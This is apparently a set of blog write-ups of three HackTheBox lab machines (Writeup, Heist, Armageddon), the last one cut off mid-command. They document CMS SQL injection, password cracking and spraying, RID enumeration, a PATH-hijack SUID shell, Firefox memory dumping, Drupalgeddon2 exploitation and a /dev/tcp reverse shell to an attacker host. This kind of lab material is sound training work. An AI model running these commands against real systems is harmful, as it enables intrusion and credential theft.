[{"content":"Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.\nSkills Learned  Exploiting CMS Made Simple Path Hijack  Tools  Nmap CMS Made Simple Exploit PoC  Reconnaissance Nmap A full tcp scan using nmap discovers two open ports: SSH on port 22 and an Apache web server on port 80.\n→ kali@kali «writeup» «10.10.14.83» $ nmap -p- -oA nmap/10-tcp-allport-writeup 10.10.10.138 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 15:32 EDT Nmap scan report for 10.10.10.138 Host is up (0.052s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 109.90 seconds → kali@kali «writeup» «10.10.14.83» $ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-writeup 10.10.10.138 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 15:50 EDT Nmap scan report for 10.10.10.138 Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds nmap also identified a disallowed directory called /writeup/ on the hosted site from a robot.txt file.\nEnumeration TCP 80 - Website Heading to the website, I find an announcement which states that the server has DoS protection. So I will avoid any form of brute-force attack.\nI\u0026rsquo;ve added the domain name writeup.htb from the email listed above to my /etc/hosts. Poking the site again with domain name doesn\u0026rsquo;t show any different.\n→ kali@kali «writeup» «10.10.14.83» $ curl -s http://writeup.htb/ | wc -c 3032 → kali@kali «writeup» «10.10.14.83» $ curl -s http://10.10.10.138/ | wc -c 3032 /writeup/ Poking the /writeup/ directory with hostname only shows 5 bytes different, and that\u0026rsquo;s probably because the URL in the source changed from number to character.\n→ kali@kali «writeup» «10.10.14.83» $ curl -s http://10.10.10.138/writeup/ | wc -c 1556 → kali@kali «writeup» «10.10.14.83» $ curl -s http://writeup.htb/writeup/ | wc -c 1551 The site looks like still WIP.\nOn the page source, it shows that the site is generated using CMS Made Simple.\nI found that the index page itself has one parameter called page. Judging from the .php extension and the parameter, the site might be interacting with a database.\n http://10.10.10.138/writeup/index.php?page=writeup  Finding Vulnerabilities Since this is an easy box, I started to look for an exploit on Google. Using the box release date (08 Jun 2019) as a hint, I found some potential exploits.\nFoothold Shell as jkr Unauthenticated SQL Injection on CMS Made Simple \u0026lt;= 2.2.9 The SQL injection vulnerability is classified as CVE-2019-9053, and it doesn\u0026rsquo;t require authentication. I will be using this poc to exploit this vuln.\nThe exploit found one password hash for user jkr.\nPassword Cracking The password can be cracked using hashcat. It recovered to raykayjay9.\n./hashcat.exe -m 20 \u0026#34;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807\u0026#34; ../../rockyou.txt -O 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9 Session..........: hashcat Status...........: Cracked Hash.Name........: md5($salt.$pass) SSH - jkr The password work on SSH for user jkr.\n→ kali@kali «exploits» «10.10.14.83» $ ssh jkr@10.10.10.138 jkr@10.10.10.138\u0026#39;s password: Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux ...[SNIP]... Last login: Sun Jul 11 08:31:07 2021 from 10.10.14.28 jkr@writeup:~$ id \u0026amp;\u0026amp; ip a uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev) 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:b9:2d:3a brd ff:ff:ff:ff:ff:ff inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feb9:2d3a/64 scope link valid_lft forever preferred_lft forever The user flag is done here.\njkr@writeup:~$ cat user.txt d4e49...[SNIP]... Privilege Escalation Shell as root Enumeration During process inspection, I noticed that the root user executed the following command, which occurs every time jkr logs in.\nsh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d \u0026gt; /run/motd.dynamic.new According to the man page of env, the -i flag means the execution starts with an empty environment.\nUser jkr is a member of the staff group [source], so it is possible to hijack the run-parts binary since I have write access on /usr/local/.\nIf it was too wordy, see the example below.\nThe executables under /usr/local/bin/ overrides the ones under /bin.\nPath Hijack I will create a script that copies the bash to /tmp/ under /usr/local/bin/ and I will name it as run-script.\njkr@writeup:/tmp$ echo -e \u0026#39;#!/bin/sh\\ncp /bin/bash /tmp/iamf \u0026amp;\u0026amp; chmod 4755 /tmp/iamf\u0026#39; \u0026gt; /usr/local/bin/run-parts jkr@writeup:/tmp$ chmod +x /usr/local/bin/run-parts Then, I will I start another SSH login to trigger the script.\n→ kali@kali «exploits» «10.10.14.83» $ ssh jkr@10.10.10.138 jkr@10.10.10.138\u0026#39;s password: And my copy of bash is now available in /tmp/. Since it has SUID of root, I can become root by executing the bash using -p flag.\n Reference(s)  https://www.exploit-db.com/exploits/46635 https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-writeup/","summary":"Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.","tags":["Linux","CVE-2019-9053","Path-hijack"],"title":"HackTheBox - Writeup"},{"content":"Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system. There are multiple instances of Firefox running which can be dumped to obtain the password for administrator account.\nSkills Learned  Password spray attack Username enumeration via RPC using RID brute-force. Process dump  Tools  Nmap CrackMapExec Hashcat  Reconnaissance Nmap A full TCP scan using nmap discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.\n→ kali@kali «heist» «10.10.14.83» $ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 21:43 EDT Nmap scan report for 10.10.10.149 Host is up (0.069s latency). Not shown: 65530 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 5985/tcp open wsman 49669/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 148.82 seconds → kali@kali «heist» «10.10.14.83» $ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 21:46 EDT Nmap scan report for 10.10.10.149 Host is up (0.061s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49669/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m52s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-07-12T01:50:42 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.94 seconds I probably won\u0026rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in this post).\nEnumeration TCP 445 - SMB Without credentials, I can\u0026rsquo;t do much on SMB.\n→ kali@kali «heist» «10.10.14.83» $ smbclient -N -L //10.10.10.149 session setup failed: NT_STATUS_ACCESS_DENIED TCP 80 - Website Visiting the website on port 80 presented with a login page.\nNo register button was found here, so I clicked the guest login and it brought me to the following page.\nFrom the chat above, user Hazard attached his cisco configuration in a text file, and this config file contains several credentials.\nI know this is not my business, but looks like this part messed up his router 😅.\nSo anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.\nPassword Crack The first password can be recovered with hashcat (identified as md5crypt).\n$ ./hashcat.exe -m 500 hashes/heist-cisco.hash ../../rockyou.txt -O ...[SNIP]... $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent Session..........: hashcat Status...........: Cracked Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91 Time.Started.....: Mon Jul 12 08:58:28 2021 (2 secs) Time.Estimated...: Mon Jul 12 08:58:30 2021 (0 secs) Guess.Base.......: File (../../rockyou.txt) ...[SNIP]... The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using this site .\nNow I have one password and two set of credentials.\n?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword admin:02375012182C1A1D751618034F36415408:Q4)sJu\\Y8qz*A3?d Access as Hazard Password Spray With user hazard included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using crackmapexec. The results reveals that the password stealth1agent works for user hazard, but it doesn\u0026rsquo;t show \u0026ldquo;Pwn3d!\u0026rdquo; message, this means I have no access to WinRM.\n→ kali@kali «heist» «10.10.14.83» $ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list SMB 10.10.10.149 445 SUPPORTDESK [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) SMB 10.10.10.149 445 SUPPORTDESK [+] SupportDesk\\hazard:stealth1agent Another spray shows that user hazard can login into RPC servic as well.\n→ kali@kali «heist» «10.10.14.83» $ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149 [*] Trying user@password: hazard@stealth1agent Account Name: Hazard, Authority Name: SUPPORTDESK [*] Trying user@password: hazard@$uperP@ssword Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE [*] Trying user@password: hazard@Q4)sJu\\Y8qz*A3?d Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE [*] Trying user@password: admin@stealth1agent Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE [*] Trying user@password: admin@$uperP@ssword Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE [*] Trying user@password: admin@Q4)sJu\\Y8qz*A3?d Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE User Enumeration via RPC Since the share doesn\u0026rsquo;t contain anything juicy, the other things I can do with user hazard is enumeration on RPC.\nWithin rpcclient shell, enumdomusers is typically used to enumerate domain users, but it doesn\u0026rsquo;t work here.\n→ kali@kali «heist» «10.10.14.83» $ rpcclient -U \u0026#39;hazard%stealth1agent\u0026#39; 10.10.10.149 rpcclient $\u0026gt; srvinfo 10.10.10.149 Wk Sv NT SNT platform_id : 500 os version : 10.0 server type : 0x9003 rpcclient $\u0026gt; enumdomusers result was NT_STATUS_CONNECTION_DISCONNECTED Based on the result, the problem here was not the user\u0026rsquo;s permissions. But, fortunately, the lookupnames command can be used to retrieve user\u0026rsquo;s SID.\nrpcclient $\u0026gt; lookupnames hazard hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1) Reverse lookups (SID to username) also works here.\nrpcclient $\u0026gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008 S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\\Hazard (1) In Windows system, excluding RID, this value S-1-5-21-4254423774-1266059056-3197185112-RID is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.\nThe enumeration can be scripted using bash, and I\u0026rsquo;ve created one to enumerate the first 20 users.\n#!/bin/bash  sid=\u0026#34;S-1-5-21-4254423774-1266059056-3197185112\u0026#34; for i in `seq 1000 1020`; do rpcclient -U \u0026#34;hazard%stealth1agent\u0026#34; -c \u0026#34;lookupsids $sid-$i;quit\u0026#34; 10.10.10.149 | cut -d \u0026#39; \u0026#39; -f2 done  Note: enumdomusers RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it\u0026rsquo;s 0x1F4.\n I saved the script as rpc-userenum.sh and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.\nFoothold Shell as Chase Password Spray With updated username wordlist, I could do another password spray attack on WinRM. The results shows a \u0026ldquo;Pwn3d!\u0026rdquo; message for user chase with a password of Q4)sJu\\Y8qz*A3?d .\n→ kali@kali «heist» «10.10.14.83» $ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list WINRM 10.10.10.149 5985 NONE [*] None (name:10.10.10.149) (domain:None) WINRM 10.10.10.149 5985 NONE [*] http://10.10.10.149:5985/wsman ...[SNIP]... WINRM 10.10.10.149 5985 NONE [+] None\\chase:Q4)sJu\\Y8qz*A3?d (Pwn3d!) WinRM - Chase I can login into the system with chase\u0026rsquo;s credentials using evil-winrm. The user flag is done here.\n→ kali@kali «heist» «10.10.14.83» $ evil-winrm -i 10.10.10.149 -u \u0026#39;chase\u0026#39; -p \u0026#39;Q4)sJu\\Y8qz*A3?d\u0026#39; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Chase\\Documents\u0026gt; whoami; hostname; ipconfig; type ..\\Desktop\\user.txt supportdesk\\chase SupportDesk Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15 IPv4 Address. . . . . . . . . . . : 10.10.10.149 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15 10.10.10.2 a127d...[SNIP]... Tools Share Before going further, I would like to host my essential tools using impacket-smbserver.\n→ kali@kali «heist» «10.10.14.83» $ impacket-smbserver ef ~/tools -smb2support -username ef -password ef Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.10.149,49708) [*] AUTHENTICATE_MESSAGE (\\ef,SUPPORTDESK) [*] User SUPPORTDESK\\ef authenticated successfully ...[SNIP]... The share then used on Heist. With this, I could use any of my tools directly from the share.\n*Evil-WinRM* PS C:\\\u0026gt; net use \\\\10.10.14.83\\ef /user:ef ef The command completed successfully. *Evil-WinRM* PS C:\\\u0026gt; cd \\\\10.10.14.83\\ef *Evil-WinRM* PS Microsoft.PowerShell.Core\\FileSystem::\\\\10.10.14.83\\ef\u0026gt; Privilege Escalation Shell as Administrator Enumeration In chase\u0026rsquo;s Desktop there is another file called todo.txt. As the name implies, it contains to-do list.\n*Evil-WinRM* PS C:\\Users\\Chase\\Desktop\u0026gt; type todo.txt Stuff to-do: 1. Keep checking the issues list. 2. Fix the router config. Done: 1. Restricted access for guest user. While looking at the WinPEAS output, I noticed multiple Firefox processes were running.\n[+] Current TCP Listening Ports [?] Check for services restricted from the outside Enumerating IPv4 connections Protocol Local Address Local Port Remote Address Remote Port State Process ID Process Name ...[SNIP]... TCP 127.0.0.1 49672 127.0.0.1 49673 Established 6868 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49673 127.0.0.1 49672 Established 6868 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49674 127.0.0.1 49675 Established 6016 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49675 127.0.0.1 49674 Established 6016 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49680 127.0.0.1 49681 Established 5496 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49681 127.0.0.1 49680 Established 5496 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49682 127.0.0.1 49683 Established 2068 C:\\Program Files\\Mozilla Firefox\\firefox.exe TCP 127.0.0.1 49683 127.0.0.1 49682 Established 2068 C:\\Program Files\\Mozilla Firefox\\firefox.exe Based on the to-do list, this means that user chase periodically open a browser to check the issues list.\nDump Firefox Process I will employs procdump64.exe to dump the Firefox data from the memory.\n*Evil-WinRM* PS C:\\iamf\u0026gt; \\\\10.10.14.83\\ef\\procdump64.exe -accepteula -ma 6868 ProcDump v10.0 - Sysinternals process dump utility Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [23:07:07] Dump 1 initiated: C:\\iamf\\firefox.exe_210712_230707.dmp [23:07:07] Dump 1 writing: Estimated dump file size is 535 MB. [23:07:08] Dump 1 complete: 536 MB written in 1.5 seconds [23:07:09] Dump count reached. Because I don\u0026rsquo;t want to grab that fatty 536 MB file, I will use strings64.exe and redirect the output to a text file to get some readable part from the dump file.\n*Evil-WinRM* PS C:\\iamf\u0026gt; cmd /c \u0026#34;\\\\10.10.14.83\\ef\\strings64.exe -accepteula firefox.exe_210712_230707.dmp \u0026gt; foxdump.txt\u0026#34; cmd.exe : + CategoryInfo : NotSpecified: (:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError Strings v2.54 - Search for ANSI and Unicode strings in binary images. Copyright (C) 1999-2021 Mark Russinovich Sysinternals - www.sysinternals.com *Evil-WinRM* PS C:\\iamf\u0026gt; dir Directory: C:\\iamf Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/12/2021 11:07 PM 547841456 firefox.exe_210712_230707.dmp -a---- 7/12/2021 11:18 PM 136871696 foxdump.txt Searching for a string \u0026ldquo;password\u0026rdquo; in the converted dump file reveals the password used by admin (4dD!5}x/re8]FBuZ).\n*Evil-WinRM* PS C:\\iamf\u0026gt; gc foxdump.txt | select-string \u0026#34;password\u0026#34; \u0026#34;C:\\Program Files\\Mozilla Firefox\\firefox.exe\u0026#34; localhost/login.php?login_username=admin@support.htb\u0026amp;login_password=4dD!5}x/re8]FBuZ\u0026amp;login= ...[SNIP]... [Side note]\nIf this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.\nWinRM - Administrator The password 4dD!5}x/re8]FBuZ is reused for administrator account.\n→ kali@kali «heist» «10.10.14.83» $ evil-winrm -i 10.10.10.149 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;4dD!5}x/re8]FBuZ\u0026#39; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami; hostname; ipconfig; type ..\\Desktop\\root.txt supportdesk\\administrator SupportDesk Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91 Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15 IPv4 Address. . . . . . . . . . . : 10.10.10.149 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15 10.10.10.2 50dfa...[SNIP]...  Reference(s)  https://davidbombal.com/cisco-type-7-password-decryption/ https://docs.microsoft.com/en-us/sysinternals/downloads/procdump  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-heist/","summary":"Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system.","tags":["OSCP-like","Windows","Password-spray","Password-reuse","Procdump","Firefox"],"title":"HackTheBox - Heist"},{"content":"Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I\u0026rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to login and dump the user credentials from MySQL database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.\nSkills Learned  Drupal 7 exploitation using Drupalgeddon2 Privilege escalation via malicious snap package  Tools  Nmap Metasploit Dirty_sockv2.py  Reconnaissance Nmap An initial nmap scan discovers two open ports: SSH on 22 and an Apache Web Server serving Drupal 7 on 80.\n→ kali@kali «armageddon» «10.10.14.4» $ nmap -sC -sV -oA scans/10-initial-armageddon 10.129.90.96 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-29 22:27 EDT Nmap scan report for 10.129.90.96 Host is up (0.30s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Mar 29 22:28:01 2021 -- 1 IP address (1 host up) scanned in 51.04 seconds Nmap also identified the OS as CentOs, so there is a chance that it would only allow outgoing connection to ports below 1024.\nEnumeration TCP 80 - Website Visiting port 80 presents a page that has no other content except a login form.\nA previous nmap scan detected that there was a changelog file. Poking /CHANGELOG.txt discovers the exact version of this Drupal instance.\n→ kali@kali «armageddon» «10.10.14.4» $ curl -s http://10.129.90.96/CHANGELOG.txt Drupal 7.56, 2017-06-21 ----------------------- - Fixed security issues (access bypass). See SA-CORE-2017-003. ...[SNIP]... Finding Vulnerabilities searchsploit pops up a lot of exploit results related to Drupal 7. But, based on the results, it is clear that the current version of Drupal seems to be vulnerable to remote code execution.\n→ kali@kali «armageddon» «10.10.14.4» $ searchsploit Drupal 7 ----------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------- --------------------------------- Drupal 7.0 \u0026lt; 7.31 - \u0026#39;Drupalgeddon\u0026#39; SQL Injection (Add Admin User) | php/webapps/34992.py Drupal 7.0 \u0026lt; 7.31 - \u0026#39;Drupalgeddon\u0026#39; SQL Injection (Admin Session) | php/webapps/44355.php Drupal 7.0 \u0026lt; 7.31 - \u0026#39;Drupalgeddon\u0026#39; SQL Injection (PoC) (Reset Password) (1) | php/webapps/34984.py Drupal 7.0 \u0026lt; 7.31 - \u0026#39;Drupalgeddon\u0026#39; SQL Injection (PoC) (Reset Password) (2) | php/webapps/34993.php Drupal 7.0 \u0026lt; 7.31 - \u0026#39;Drupalgeddon\u0026#39; SQL Injection (Remote Code Execution) | php/webapps/35150.php Drupal 7.12 - Multiple Vulnerabilities | php/webapps/18564.txt Drupal 7.x Module Services - Remote Code Execution | php/webapps/41564.php Drupal \u0026lt; 4.7.6 - Post Comments Remote Command Execution | php/webapps/3313.pl Drupal \u0026lt; 7.34 - Denial of Service | php/dos/35415.txt Drupal \u0026lt; 7.34 - Denial of Service | php/dos/35415.txt Drupal \u0026lt; 7.58 - \u0026#39;Drupalgeddon3\u0026#39; (Authenticated) Remote Code (Metasploit) | php/webapps/44557.rb Drupal \u0026lt; 7.58 - \u0026#39;Drupalgeddon3\u0026#39; (Authenticated) Remote Code Execution (PoC) | php/webapps/44542.txt Drupal \u0026lt; 7.58 / \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Executio | php/webapps/44449.rb Drupal \u0026lt; 7.58 / \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Executio | php/webapps/44449.rb Drupal \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution (Metasp | php/remote/44482.rb Drupal \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution (PoC) | php/webapps/44448.py Drupal \u0026lt; 8.5.11 / \u0026lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Exe | php/remote/46510.rb Drupal \u0026lt; 8.6.10 / \u0026lt; 8.5.11 - REST Module Remote Code Execution | php/webapps/46452.txt Drupal \u0026lt; 8.6.9 - REST Module Remote Code Execution | php/webapps/46459.py Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure | php/webapps/44501.txt Drupal Module CKEditor \u0026lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scrip | php/webapps/25493.txt Drupal Module Coder \u0026lt; 7.x-1.3/7.x-2.6 - Remote Code Execution | php/remote/40144.php Drupal Module Cumulus 5.x-1.1/6.x-1.4 - \u0026#39;tagcloud\u0026#39; Cross-Site Scripting | php/webapps/35397.txt Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit) | php/remote/40130.rb ----------------------------------------------------------------------------------- --------------------------------- Since \u0026ldquo;Drupalgeddon2\u0026rdquo; exploits doesn\u0026rsquo;t state it requires authentication, I will give it a try.\nFoothold Shell as apache Metasploit - Drupalgeddon 2 Metasploit has a module for Drupalgeddon2 ( exploit/unix/webapp/drupal_drupalgeddon2). On my first attempt, it returned with no session.\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) \u0026gt; set RHOSTS 10.129.90.96 RHOSTS =\u0026gt; 10.129.90.96 msf6 exploit(unix/webapp/drupal_drupalgeddon2) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf6 exploit(unix/webapp/drupal_drupalgeddon2) \u0026gt; set LPORT 9001 LPORT =\u0026gt; 9001 msf6 exploit(unix/webapp/drupal_drupalgeddon2) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.4:9001 [*] Executing automatic check (disable AutoCheck to override) [+] The target is vulnerable. [*] Exploit completed, but no session was created By assuming that the firewall blocks all outgoing ports except well-known, I changed my listening port to 443, and now it successfully opened a session.\nmsf6 exploit(unix/webapp/drupal_drupalgeddon2) \u0026gt; set lport 443 lport =\u0026gt; 443 msf6 exploit(unix/webapp/drupal_drupalgeddon2) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.4:443 [*] Executing automatic check (disable AutoCheck to override) [+] The target is vulnerable. [*] Sending stage (39282 bytes) to 10.129.90.96 [*] Meterpreter session 1 opened (10.10.14.4:443 -\u0026gt; 10.129.90.96:44612) at 2021-03-29 23:47:59 -0400 meterpreter \u0026gt; shell Process 9611 created. Channel 0 created. whoami apache pwd /var/www/html I sent the following command because I wanted to change my shell, so I could do the PTY trick.\n$ bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/88 0\u0026gt;\u0026amp;1\u0026#39; On my listener\n→ kali@kali «armageddon» «10.10.14.4» $ nc -nvlp 88 listening on [any] 88 ... connect to [10.10.14.4] from (UNKNOWN) [10.129.90.96] 58422 bash: no job control in this shell bash-4.2$ However, I\u0026rsquo;m unable to get the PTY trick working. It always returns the following error.\nbash-4.2$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 -c \u0026#39;import 